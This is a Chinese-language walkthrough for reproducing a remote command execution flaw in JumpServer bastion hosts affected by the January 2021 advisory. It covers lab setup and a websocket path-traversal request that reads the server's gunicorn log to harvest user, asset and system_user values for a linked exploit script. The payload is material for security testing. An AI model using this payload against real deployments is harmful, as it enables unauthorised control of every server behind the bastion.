漏洞简介

JumpServer是一款开源的堡垒机，是符合4A规范的运维安全审计系统，通俗来说就是跳板机。2021年1月15日，JumpServer发布安全更新，修复了一处远程命令执行漏洞。由于JumpServer某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令


影响版本

JumpServer < v2.6.2

JumpServer < v2.5.4

JumpServer < v2.4.5

JumpServer = v1.5.9


环境搭建

下载地址：git clone https://github.com/jumpserver/installer.git

下载完成后进入installer目录下


环境较大，启动较慢，可以先开启docker加速

国内docker源加速

export DOCKER_IMAGE_PREFIX=docker.mirrors.ustc.edu.cn


./jmsctl.sh install  安装环境

./jmsctl.sh upgrade v2.6.1  安装完成后升级到指定版本

./jmsctl.sh restart  重启服务


访问登录，验证安装



利用ws进行连接，读取日志（google插件：Websocket Test Client）


URL：ws//目标IP/ws/ops/tasks/log/

Request:{"task":"../../../../../../../../../opt/jumpserver/logs/gunicorn"}  #该路径为jumpserver默认日志                   路径


从日志中找出user，asset，system_user三个参数


将这三个参数替换到脚本中，且将host改为目标IP（脚本链接在文章结尾）




启动脚本，连接成功
